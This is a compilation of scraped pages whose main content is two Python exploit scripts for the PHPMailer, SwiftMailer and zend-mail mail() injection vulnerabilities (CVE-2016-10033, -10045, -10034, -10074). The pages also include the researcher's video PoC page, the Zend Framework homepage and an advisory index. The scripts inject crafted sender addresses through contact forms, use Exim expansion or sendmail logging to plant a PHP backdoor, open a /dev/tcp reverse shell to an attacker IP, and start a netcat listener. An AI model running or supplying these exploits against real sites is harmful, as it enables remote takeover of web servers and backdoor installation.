# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
#
# ExploitBox project:
# https://ExploitBox.io
#
# Full advisory URL:
# https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
# https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
# http://pwnscriptum.com/
#
# --------------------------------------------------------
# Enhanced for Exim MTA
#
# N.B:
# The original author's method in the PHPMailer POC (for sendmail MTA) uses the RFC 3696
# double quotes technique associated with the -oQ -X options to log mailer traffic and to create
# the backdoor. This technique is not facing some payload size issues because the payload
# was in the email body.
#
# For Exim:
# The original author's Wordpress 4.6 POC for Exim combines the comment syntax (RFC 822)
# and the Exim expansion mode techniques. The use of substr on spool\_directory and tod\_log
# expansion variables in order to bypass the PHP mail() escaping may leads to large
# email addresses payloads. However the comment syntax validateAddress() technique does not
# face any size limitation but its use can not be applied for PHPMailer < 5.2.20.
#
# Goal:
# The use of double quotes validateAdresse() technique (and it's patch bypass for PHPMailer < 5.5.20)
# combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses
# size limit here (260 chars) and so not matching the pcre8 regexp in the validateAddress() function.
# We are now base64 encoding the command in order to bypass escapeshellcmd() and allowing larger payloads.
#
#
# Usage:
# ./rce\_phpmailer\_exim4.py -url http://victim/phpmailer/ -cf contact\_form.php -ip 192.168.1.109 -p 1337
#
#
# Requirements:
# - Vulnerable PHP libraries
# - Exim MTA Agent
#
#
# Disclaimer:
# For testing purposes only on your local machine - http://pwnscriptum.com/PwnScriptum\_PHPMailer\_PoC\_contactform.zip
import argparse
import urllib
import urllib2
import base64
# Prepare command for Exim expansion mode in order
def prepare\_cmd(cmd):
return '${run{${base64d:%s}}}' % base64.b64encode(cmd)
# Send Request method
def send\_request(req):
try:
urllib2.urlopen(req)
except urllib2.HTTPError, e:
print "[!] Got HTTP error: [%d] when trying to reach " + req.get\_full\_url() + " - Check the URL!\n\n" % e.code
exit(3)
except urllib2.URLError, err:
print "[!] Got the '%s' error when trying to reach " + req.get\_full\_url() + " - Check the URL!\n\n" % err.reason
exit(4)
# Parse input args
parser = argparse.ArgumentParser(prog='rce\_phpmailer\_exim4.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit for Exim4 based on LegalHackers sendmail version')
parser.add\_argument('-url', dest='WEBAPP\_BASE\_URL', help='WebApp Base Url')
parser.add\_argument('-cf', dest='CONTACT\_SCRIPT', help='Contact Form scriptname')
parser.add\_argument('-ip', dest='ATTACKER\_IP', help='Attacker IP for reverse shell')
parser.add\_argument('-p', dest='ATTACKER\_PORT', help='Attackers Port for reverse shell', default="8888")
parser.add\_argument('--display', dest='DISPLAY', help='Only display payload to be manually inserted', action="store\_true")
parser.add\_argument('--post-action', dest='POST\_ACTION', help='Overrides POST "action" field name', default="send")
parser.add\_argument('--post-name', dest='POST\_NAME', help='Overrides POST "name of sender" field name', default="name")
parser.add\_argument('--post-email', dest='POST\_EMAIL', help='Overrides POST "email" field name', default="email")
parser.add\_argument('--post-msg', dest='POST\_MSG', help='Overrides POST "message" field name', default="msg")
args = parser.parse\_args()
# Test if DISPLAY mode is activated
if not args.DISPLAY:
# Some arguments are required
if args.WEBAPP\_BASE\_URL is None:
parser.error("argument -url is required")
if args.CONTACT\_SCRIPT is None:
parser.error("argument -cf is required")
if args.ATTACKER\_IP is None:
parser.error("argument -ip is required")
# Show params
print """[+] Setting vars to: \n
WEBAPP\_BASE\_URL = [%s]
CONTACT\_SCRIPT = [%s]
ATTACKER\_IP = [%s]
ATTACKER\_PORT = [%s]
POST\_ACTION = [%s]
POST\_NAME = [%s]
POST\_EMAIL = [%s]
POST\_MSG = [%s]
""" % (args.WEBAPP\_BASE\_URL, args.CONTACT\_SCRIPT, args.ATTACKER\_IP, args.ATTACKER\_PORT, args.POST\_ACTION, args.POST\_NAME, args.POST\_EMAIL, args.POST\_MSG)
# Ask for mail library
print "[+] Choose your target / payload: "
print "\033[1;34m"
print "[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)"
print " SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)"
print " Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"
print "[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass"
print "\033[0m"
try:
target = int(raw\_input('[?] Select target [1-2]: '))
except ValueError:
print "Not a valid choice. Exiting\n"
exit(2)
if (target>2):
print "No such target. Exiting\n"
exit(3)
################################
# Payload
################################
cmd = "/bin/bash -c '0<&196;exec 196<>/dev/tcp/%s/%s;nohup sh <&196 >&196 2>&196 &'" % (args.ATTACKER\_IP, args.ATTACKER\_PORT)
# Settings the cmd for testing purpose if DISPLAY mode is activated
if args.DISPLAY:
print "[+] DISPLAY mode"
cmd = raw\_input('[?] Enter the command you want to test on the victim:\n')
if not cmd:
print "Input could not be empty. Exiting\n"
exit(2)
# preparing the payload
prepared\_cmd = prepare\_cmd(cmd)
payload = '"a\\" -be ' + prepared\_cmd + ' "@a.co'
# Update payloads for PHPMailer bypass (PHPMailer < 5.2.20)
if target == 2:
payload = "\"a\\' -be " + prepared\_cmd + " \"@a.co"
# if DISPLAY mode, we are not playing the attacking episode
if args.DISPLAY:
print "\033[1;32m[+] You should try in the sender input field the following payload:\033[0m"
print payload
exit(0)
################################
# Attack episode
# This step will execute the reverse shell
################################
CONTACT\_SCRIPT\_URL = args.WEBAPP\_BASE\_URL + args.CONTACT\_SCRIPT
# Form fields
post\_fields = {'action': "%s" % args.POST\_ACTION, "%s" % args.POST\_NAME: 'Jas Fasola', "%s" % args.POST\_EMAIL: payload, "%s" % args.POST\_MSG: 'Really important message'}
# Print relevant information
print "\n[+] Executing command on victim server\n"
print '[!] command: [%s]' % cmd
print '[!] payload: [%s]' % payload
print '[!] post\_fields: [%s]\n' % str(post\_fields)
data = urllib.urlencode(post\_fields)
req = urllib2.Request(CONTACT\_SCRIPT\_URL, data)
send\_request(req)
print "\033[1;32m[+] You should check your listener and cross the fingers ;)\033[0m\n"


=== Content from legalhackers.com_3fd44ba6_20250126_083808.html ===


[## **[white-paper] Pwning PHP mail() function For Fun And Remote Code Execution**

# (New Exploitation Techniques And Vectors - i.e what's been missed so far)](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

### by **Dawid Golunski** <https://legalhackers.com>

[Follow @dawid\_golunski](https://twitter.com/dawid_golunski)

 **[<-- Back To legalhackers.com](https://legalhackers.com)**



=== Content from legalhackers.com_1b0c5280_20250126_083808.html ===
#!/usr/bin/python
intro = """\033[94m
\_\_ \_\_ \_\_ \_\_ \_\_
/ / \_\_\_ \_\_\_\_ \_\_\_\_\_ \_/ / / / / /\_\_\_ \_\_\_\_\_\_/ /\_\_\_\_\_ \_\_\_\_\_\_\_\_\_\_
/ / / \_ \/ \_\_ `/ \_\_ `/ / / /\_/ / \_\_ `/ \_\_\_/ //\_/ \_ \/ \_\_\_/ \_\_\_/
/ /\_\_\_/ \_\_/ /\_/ / /\_/ / / / \_\_ / /\_/ / /\_\_/ ,< / \_\_/ / (\_\_ )
/\_\_\_\_\_/\\_\_\_/\\_\_, /\\_\_,\_/\_/ /\_/ /\_/\\_\_,\_/\\_\_\_/\_/|\_|\\_\_\_/\_/ /\_\_\_\_/
/\_\_\_\_/
PHPMailer / Zend-mail / SwiftMailer - Remote Code Execution Exploit
a.k.a "PwnScriptum"
CVE-2016-10033 + CVE-2016-10045 + CVE-2016-10034 + CVE-2016-10074
This PoC exploit aims to execute a reverse shell on the target in
the context of the web-server user via vulnerable PHP email library.
Discovered and Coded by:
\033[1;34m
Dawid Golunski
https://legalhackers.com
t: @dawid\_golunski for updates
\033[0m
\033[94m
P.$. For testing only! Don't break the Web ;)
\033[0m
"""
info = """
[Version]
Limited PoC (ver. 1.1)
[PoC Video]
See the the exploit in action at:
https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
[Info]
This exploit targets a common webapp component - Contact Form.
It combines payloads for the following vulns:
1. PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
2. PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045 / escapeshell bypass)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln.html
3. SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html
4. Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html
[Usage]
./PwnScriptum\_RCE\_exploit.py [-h] -url WEBAPP\_BASE\_URL -cf CONTACT\_SCRIPT
[-d TARGET\_UP\_DIR] -ip ATTACKERS\_IP
[-p ATTACKERS\_PORT] [--version]
[--post-action POST\_ACTION]
[--post-name POST\_NAME]
[--post-email POST\_EMAIL]
[--post-msg POST\_MSG]
Note, make sure the contact form matches the default field names (send/name/email/msg).
Otherwise override with --post-msg=message\_box for example.
"""
import os
import argparse
import time
import urllib
import urllib2
import socket
import sys
# The Main Meat
print intro
# Show info
if '-H' in sys.argv:
print info
exit(0)
# Parse input args
parser = argparse.ArgumentParser(prog='PwnScriptum\_RCE\_exploit.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit (a.k.a \'PwnScriptum\')\nDiscovered by Dawid Golunski (https://legalhackers.com)')
parser.add\_argument('-H', action='store\_true', default="false", required=False, help='Full Help / Info Page')
parser.add\_argument('-url', dest='WEBAPP\_BASE\_URL', required=True, help='WebApp Base Url')
parser.add\_argument('-cf', dest='CONTACT\_SCRIPT', required=True, help='Contact Form scriptname')
parser.add\_argument('-d' , dest='TARGET\_UP\_DIR', required=False, help='Target Upload Dir', default="upload")
parser.add\_argument('-ip', dest='ATTACKERS\_IP', required=True, help='Attackers Public IP for RevShell')
parser.add\_argument('-p', dest='ATTACKERS\_PORT', required=False, help='Attackers Port for RevShell listener', default="8080")
parser.add\_argument('--version', action='version', version='%(prog)s 1.1 Limited PoC')
parser.add\_argument('--post-action', dest='POST\_ACTION', required=False, help='Overrides POST "action" field name', default="send")
parser.add\_argument('--post-name', dest='POST\_NAME', required=False, help='Overrides POST "name of sender" field name', default="name")
parser.add\_argument('--post-email', dest='POST\_EMAIL', required=False, help='Overrides POST "email" field name', default="email")
parser.add\_argument('--post-msg', dest='POST\_MSG', required=False, help='Overrides POST "message" field name', default="msg")
args = parser.parse\_args()
# Preset vars
TMOUT = 3
# Set Vars
#if args.ATTACKERS\_PORT is None:
# args.ATTACKERS\_PORT = 8080
#if args.TARGET\_UP\_DIR is None:
# args.TARGET\_UP\_DIR = "upload"
# Build the target backdoor URL here (note the "random" pid bit to avoid php code collisions on multiple runs / multiple phpfile appends ;)
BACKDOOR\_FILE = 'phpbackdoor' + str(os.getpid()) + '.php'
BACKDOOR\_URL = args.WEBAPP\_BASE\_URL.rstrip('/') + '/' + args.TARGET\_UP\_DIR + '/' + BACKDOOR\_FILE
CONTACT\_SCRIPT\_URL = args.WEBAPP\_BASE\_URL + args.CONTACT\_SCRIPT
# Show params
print """[+] Setting vars to: \n
WEBAPP\_BASE\_URL = [%s]
CONTACT\_SCRIPT = [%s]
TARGET\_UP\_DIR = [%s]
ATTACKERS\_IP = [%s]
ATTACKERS\_PORT = [%s]
CONTACT\_SCRIPT\_URL = [%s]
BACKDOOR\_FILEl = [%s]
""" % (args.WEBAPP\_BASE\_URL, args.CONTACT\_SCRIPT, args.TARGET\_UP\_DIR, args.ATTACKERS\_IP, args.ATTACKERS\_PORT, CONTACT\_SCRIPT\_URL, BACKDOOR\_FILE)
print "[+] Choose your target / payload: "
print "\033[1;34m"
print """[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)\n"""
print """[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045)
The escapeshellarg() bypass :)\n"""
print """[3] SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)\n"""
print """[4] Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"""
print "\033[0m"
try:
target = int(raw\_input('[?] Select target [1-2]: '))
except ValueError:
print "Not a valid choice. Exiting\n"
exit(2)
if (target>4):
print "No such target. Exiting\n"
exit(3)
if target == 1:
# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
payload = '"attacker\\" -oQ/tmp/ -X%s/%s some"@email.com' % (args.TARGET\_UP\_DIR, BACKDOOR\_FILE)
if target == 2:
# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
payload = "\"attacker\\' -oQ/tmp/ -X%s/%s some\"@email.com" % (args.TARGET\_UP\_DIR, BACKDOOR\_FILE)
if target == 3:
# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
payload = '"attacker\\" -oQ/tmp/ -X%s/%s "@email.com' % (args.TARGET\_UP\_DIR, BACKDOOR\_FILE)
if target == 4:
# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
payload = '"attacker\\" -oQ/tmp/ -X%s/%s "@email.com' % (args.TARGET\_UP\_DIR, BACKDOOR\_FILE)
print "\n[+] Generated mail() payload will upload the backdoor into the '%s' dir\n" % args.TARGET\_UP\_DIR
# PHP RCE code to be saved into the backdoor php file on the target in TARGET\_UP\_DIR. E.g:
# e.g:
#RCE\_PHP\_CODE = "php phpinfo(); ?"
RCE\_PHP\_CODE = """php sleep(%d); system("/bin/bash -c 'nohup bash -i /dev/tcp/%s/%s 0<&1 2>&1' "); ?>""" % (TMOUT, args.ATTACKERS\_IP, args.ATTACKERS\_PORT)
# The form names might need to be adjusted
post\_fields = {'action': "%s" % args.POST\_ACTION, "%s" % args.POST\_NAME: 'Jas Fasola', "%s" % args.POST\_EMAIL: payload, "%s" % args.POST\_MSG: RCE\_PHP\_CODE}
# Attack
# Inject payload into PHPMailer / mail() via a Contact form. This should write out the backdoor
print "[+] Backdoor upload via the contact form at the URL '%s'\n" % CONTACT\_SCRIPT\_URL
data = urllib.urlencode(post\_fields)
req = urllib2.Request(CONTACT\_SCRIPT\_URL, data)
try:
urllib2.urlopen(req)
except urllib2.HTTPError, e:
print "[!] Got HTTP error: [%d] when uploading the payload. Check the URL!\n\n" % e.code
exit(3)
except urllib2.URLError, err:
print "[!] Got the '%s' error when uploading the payload. Check the URL!\n\n" % err.reason
exit(4)
# Check if the backdoor was uploaded correctly.
# A little trick here. The urlopen should timeout at sleep(X)-1 if the backdoor ran fine
# So we catch the timeout to find out.
# Is it uploaded ? Try to execute the PHP backdoor and the Reverse Shell within it
print "[+] Checking for the backdoor at the URL '%s'\n" % BACKDOOR\_URL
got\_timeout = 0
http\_err = 0
try:
urllib2.urlopen(BACKDOOR\_URL, timeout = (TMOUT-1))
except urllib2.HTTPError, e:
http\_err = e.code
except urllib2.URLError, err:
print "Some other error happened:", err.reason
except socket.timeout, e:
print "[\*] \033[1;32mLooking good!\033[0m The sleep() worked by the looks of it :) \nUrlopen timed out just in time for the shell :)\n"
got\_timeout = 1
if (got\_timeout != 1):
print "[!] Something went wrong... Error [%d]. Try another dir? Push through, don't give up! :)\n" % http\_err
exit(2)
# Spawn the shell and wait for the sleep() PHP call to finish before /bin/bash is called
print "[+] We should get a shell if we got till here! Spawning netcat now! :)\n"
print "[+] \033[1;34mPlease tell me you're seeing this too... ;)\033[0m\n"
os.system("nc -v -l -p %s" % args.ATTACKERS\_PORT)
print "\n[+] Shell closed. Removed the uploaded backdoor scripts?\n"
print "\033[1;34mP.$. There's more to it :) Exiting, for now...\033[0m\n"


=== Content from legalhackers.com_20a95537_20250126_083808.html ===


## PHPMailer/SwiftMailer/ZendFramework Video PoC Exploit

## [PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html)[PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045)](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)[SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)](http://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html)[Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)](https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html)Discovered by **Dawid Golunski** [Follow @dawid\_golunski](https://twitter.com/dawid_golunski) <https://legalhackers.com> **Description:** The video below demonstrates how an attacker could potentially compromise a website (achieve remote code execution) by exploiting one of the vulnerabilities linked above in a web application (Contact Form) implemented with the use of: PHPMailer, Zend Framework (zend-mail) and SwiftMailer. The video focuses on PHPMailer however the attack flow is common for each of the affected frameworks/libraries. Exploit shown in the video can be downloaded from: [PHPMailer/SwiftMailer/Zend-mail exploit](https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py) To receive updates on this as well as new vulnerabilities: [Follow @dawid\_golunski](https://twitter.com/dawid_golunski) ~~~~~~~~~~~ **ExploitBox.io** ~~~~~~~~~~~~~~~~ **Interested in security / vulns / exploits ?** Check out the new project of the author of this advisory: [**ExploitBox.io**A Playground & Labs for security folks into HACKING &AMp the art of exploitation](https://ExploitBox.io) ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 **[<-- BACK TO legalhackers.com](https://legalhackers.com)**



=== Content from framework.zend.com_a4b4a7db_20250126_083802.html ===


Toggle navigation

[![Zend Framework](img/zend-framework-logo.svg)](index.html)

* [ABOUT](about.1.html)
* [INSTALL](downloads.html)
* [DOCUMENTATION](learn.html)
* [TRAINING](https://www.zend.com/en/services/training)
* [BLOG](blog/index.html)
* [PARTICIPATE](participate.html)

![ZF becomes Laminas](images/zf-to-laminas.png "ZF becomes Laminas")
# Laminas Has Launched!

### Zend Framework is now the Laminas Project!

[Learn More](blog/2020-01-24-laminas-launch.html)

#### Performance

Engineered with performance tuning in mind. Zend Framework 3 runs up to 4x faster than version 2 releases!

#### Extensible

Open architecture based on Middleware or MVC, following
[PHP-FIG](http://www.php-fig.org/) standards.

#### Secure

Built with security best practices. Store passwords using [bcrypt](https://en.wikipedia.org/wiki/Bcrypt), encrypt with [AES-256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard), and more.

#### Enterprise Ready

A proven history of success running business critical and high-usage applications. Ready for [PHP 7](http://www.zend.com/en/resources/php-7).

#### Latest blog posts ( [full list](blog/index.html) )

[Endings and Beginnings: Goodbye, and Please Welcome the Laminas Project!](blog/2020-01-24-laminas-launch.html)

[From Zend to Laminas](blog/2019-04-17-announcing-laminas.html)

[Zend Framework/Homestead Integration](blog/2018-05-16-homestead.html)

[PHP 7.2 Support!](blog/2018-05-08-php-7.2-support.html)

[Async Expressive? Try Swoole!](blog/2018-03-21-expressive-swoole.html)

#### Latest security advisories ( [full list](security/advisories/index.html) )

[ZF2019-01: Information disclosure in zend-developer-tools](security/advisory/ZF2019-01.html)

[ZF2018-01: URL rewrite vulnerability](security/advisory/ZF2018-01.html)

[ZF2016-04: Potential remote code execution in zend-mail via Sendmail adapter](security/advisory/ZF2016-04.html)

[ZF2016-03: Potential SQL injection in ORDER and GROUP functions of ZF1](security/advisory/ZF2016-03.html)

#### Issues and Security

Have you found a bug in Zend Framework?

Report here!

 Have you identified a security vulnerability in ZF?

Please report it to us at
zf-security@zend.com

#### Report an issue

#### Open an issue

Zend Framework manages issues on [GitHub](https://github.com).
From the list below, please choose the package against which to report the issue,
and then click the "Open Issue" button.

Select GitHub repository:
Tutorials
Authentication
Barcode
Cache
Captcha
Code
Component Installer
Config
ConfigAggregator
ConfigAggregator ModuleManager Plugin
ConfigAggregator Templated Parameters PostProcessor
Console
Crypt
CSRF
DB
Debug
DI
Diactoros
DOM
Escaper
EventManager
Expressive
Authentication for Expressive and PSR-7
HTTP Basic Authentication for Expressive and PSR-7
Username/password authentication for zend-expressive-authentication
zend-authentication integration for Expressive
Authorization for Expressive and PSR-7
zend-permissions-acl integration for Expressive
zend-permissions-rbac integration for Expressive
Swoole support for Expressive
Feed
File
Filter
Flash
Form
HAL for PSR-7
HTTP
HTTP Request Handler Runner
Hydrator
InputFilter
Internationalization
JSON
JSON-RPC Server
LDAP
Loader
Log
Mail
Math
Memory
MIME
Module Manager
MVC
MVC-Console integration
MVC-i18n integration
fileprg() plugin
flashmessenger() plugin
identity() plugin
prg() plugin
Navigation
Paginator
ACL
RBAC
Problem Details
ProgressBar
PSR-7 Bridge
PSR-7 Sessions
PSR-7 Sessions via PSR-6 Cache Item Pools
PSR-7 Sessions via ext-session
Router
Serializer
Server
ServiceManager
ServiceManager-Di integration
Session
SOAP
Stdlib
Stratigility
Tag
Test
Text
URI
Validator
View
XML-RPC
XML2JSON
ZendDiagnostics

Close
Open Issue

## Maximize Development Productivity

![](img/ag-hero.png)

The easiest way to create high-quality APIs

[Learn more](https://apigility.org)

![](img/expressive_small.png)

PHP microservices and web apps in minutes!

[Learn more](https://getexpressive.org)

![](img/zray.png)

The Ultimate PHP Productivity Solution

[Learn more](http://www.zend.com/en/products/server/z-ray)

# Get certified!

#### Becoming a Zend Certified Engineer is a measure of your experience in the world of PHP.

#### Take a look at our PHP and Zend Framework certifications!

[![Zend Certified PHP Engineer](img/phpcert.png "Zend Certified PHP Engineer")](http://www.zend.com/en/services/certification)

[![Zend Framework 2 Certified Architect](img/zf2cert.png "Zend Framework 2 Certified Architect")](http://www.zend.com/en/services/certification)

[![Zend Framework 1 Certified Engineer](img/zf1cert.png "Zend Framework 1 Certified Engineer")](http://www.zend.com/en/services/certification)

## Who uses Zend Framework?

![](img/clients/user1.png)
### Allied Beverage(United States)

![](img/clients/user2.png)
### AutoTrack(The Netherlands)

![](img/clients/user3.png)
### BBC(UK)

![](img/clients/user4.png)
### BNP Paribas(France)

![](img/clients/user5.png)
### Caring Bridge(United States)

![](img/clients/user6.png)
### Melis Technology(France)

![](img/clients/user7.png)
### Cisco WebEx(United States)

![](img/clients/user8.png)
### Netretail holding(Czech Republic)

![](img/clients/user9.png)
### Offers.com(United States)

![](img/clients/user10.png)
### Serpro(Brazil)

![](img/clients/user11.png)
### Shaklee(United States)

![](img/clients/user12.png)
### Villery & Boch(Germany)

![](img/clients/user13.png)
### GSMInfo.nl(The Netherlands)

![](img/clients/user14.png)
### ContinuousPHP(Luxembourg)

![](img/clients/user15.png)
### Engineering(Italy)

**About**

**Install**

**Documentation**

**Participate**

[Overview](participate.html)

[Slack](https://laminas.dev/chat)

[Forums](https://discourse.laminas.dev)

[Contributor guide](participate/contributor-guide.html)

[Code Manifesto](participate/code-manifesto.html)

[Contributors](participate/contributors.html)

[Logos](participate/logos.html)

[Get certified](http://www.zend.com/en/services/certification)

[Privacy Policy](https://www.zend.com/privacy-policy)

#### Copyright

¬© 2006-2022 by [Zend](https://www.zend.com) by [Perforce](https://www.perforce.com/). Made with  by awesome [contributors](participate/contributors.html).

This website is built using [zend-expressive](https://docs.zendframework.com/zend-expressive/) and it runs on [PHP 7](http://www.zend.com/en/resources/php-7).

#### Contacts

We use cookies to allow you to dismiss dialogs such as the Laminas
Project notification.

Allow Cookies



=== Content from legalhackers.com_bd402dbf_20250126_083810.html ===


## LEGAL HACKERS

# Dawid Golunski

Information Security.

Security Research.

Legal/ethical Hacking.

Penetration Testing.

# Contact

![](static/email_sm.png) e-mail ¬†>

![](static/twit.jpg) twitter >¬†[@dawid\_golunski](https://twitter.com/%40dawid_golunski)

# Security advisories

Some of the released advisories can be found below:

1. [Git-LFS <= 2.12 Remote Code Execution (RCE) Vulnerability CVE-2020-27955](https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html)
2. [Wordpress 4.6 - Unauthenticated RCE Exploit (Remote Code Execution)](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)
3. [SquirrelMail <= 1.4.22 <= 1.4.23 Remote Code Execution (CVE-2017-7692)](./advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html)
4. [Zend Framework / zend-mail < 2.4.11 Remote Code Execution (CVE-2016-10034)](./advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html)
5. [SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)](./advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html)
6. [PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) (0day Patch Bypass/Exploit)](./advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html)
7. [PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)](./advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html)
8. [Nagios Core < 4.2.4 Root Privilege Escalation (CVE-2016-9566)](./advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html)
9. [Nagios Core < 4.2.2 Curl Command Injection / Code Execution (CVE-2016-9565 / CVE-2008-4796)](./advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html)
10. [Wget < 1.18 Access List Bypass / Race Condition (CVE-2016-7098)](./advisories/Wget-Exploit-ACL-bypass-RaceCond-CVE-2016-7098.html)
11. [Nginx (Debian-based + Gentoo distros) - Root Privilege Escalation (CVE-2016-1247)](./advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
12. [MySQL / MariaDB / Percona - Privilege Esc. / Race Condition (CVE-2016-6663 / CVE-2016-5616)](./advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)
13. [MySQL / MariaDB / Percona - Root Privilege Escalation (CVE-2016-6664 / CVE-2016-5617)](./advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html)
14. [Apache Tomcat (RedHat-based distros) - Root Privilege Escalation (CVE-2016-5425)](./advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html)
15. [Apache Tomcat (Debian-based distros) <= 6/7/8 Root Privilege Escalation (CVE-2016-1240)](./advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html)
16. [MySQL / MariaDB / Percona - Remote Root Code Execution / Privilege Esc. (0day) (CVE-2016-6662)](./advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html)
17. [Adobe ColdFusion <= 11 XML External Entity (XXE) Injection (CVE-2016-4264)](./advisories/Adobe-ColdFusion-11-XXE-Exploit-CVE-2016-4264.html)
18. [vBulletin <= 5.2.2 Preauth Server Side Request Forgery (SSRF) (CVE-2016-6483)](./advisories/vBulletin-SSRF-Vulnerability-Exploit.html)
19. [Wget < 1.18 Arbitrary File Upload / Remote Code Execution (CVE-2016-4971)](./advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.html)
20. [CakePHP Framework <= 3.2.4 IP Spoofing Vulnerability](./advisories/CakePHP-IP-Spoofing-Vulnerability.html)
21. [Exim <= 4.86.2 Local Root Privilege Escalation](./advisories/Exim-Local-Root-Privilege-Escalation.html)
22. [Google AdWords API PHP client library <= 6.2.0 PHP Code Execution](./advisories/Google-AdWords-PHP-Client-library-PHP-Code-Execution.html)
23. [Google AdWords API client libraries - XML eXternal Entity Injection (XXE)](./advisories/Google-AdWords-API-libraries-XXE-Injection-Vulnerability.html)
24. [eBay Magento <= 1.9.2.1 XML eXternal Entity Injection (XXE) on PHP FPM](./advisories/eBay-Magento-XXE-Injection-Vulnerability.html)
25. [eBay Magento <= 1.9.2.1 Unrestricted Cron Script (Potential Code Execution / DoS)](./advisories/eBay-Magento-Unrestricted-Cron-Script-Vulnerability.html)
26. [Kirby CMS <= 2.1.0 Authentication Bypass via Path Traversal](./advisories/KirbyCMS-Path-Traversal-Authentication-Bypass-Vulnerability.html)
27. [Kirby CMS <= 2.1.0 CSRF Content Upload and PHP Script Execution](./advisories/KirbyCMS-CSRF-PHP-File-Upload-Vulnerability.html)
28. [Zend Framework <= 2.4.2 XML eXternal Entity Injection (XXE) on PHP FPM](./advisories/zend-framework-XXE-vuln.html)
29. [Nagios - Nagios Plugins - check\_dhcp = 2.0.2 Race Condition](./advisories/nagios-check_dhcp-race.html)
30. [Nagios - Nagios Plugins - check\_dhcp <= 2.0.1 Arbitrary Option File Read](./advisories/nagios-check_dhcp.html)
31. [Nagios - NRPE - Nagios Remote Plugin Executor <= 2.15 Remote Command Execution](./advisories/nagios-nrpe.html)
32. [Zabbix <= 1.8.1 SQL Injection](./advisories/zabbix181api-sql.html)
33. [Invision Power Board <= 3.0.4 Local PHP File Inclusion and SQL Injection](./advisories/invision_power_board_multiple_vulns.html)
34. [WordPress <= 2.8.5 Unrestricted File Upload Arbitrary PHP Code Execution](./advisories/wordpress_unrestricted_file_upload_vuln.html)

# PGP key

```
-----BEGIN [PGP PUBLIC KEY](http://legalhackers.com/dawid_lh.pgp) BLOCK-----

mQENBFXIwTYBCACx+HDekh0eiPpqXZOfbrQKKrbc5VZw6dB1HSIHPXZ9ifGMhGow
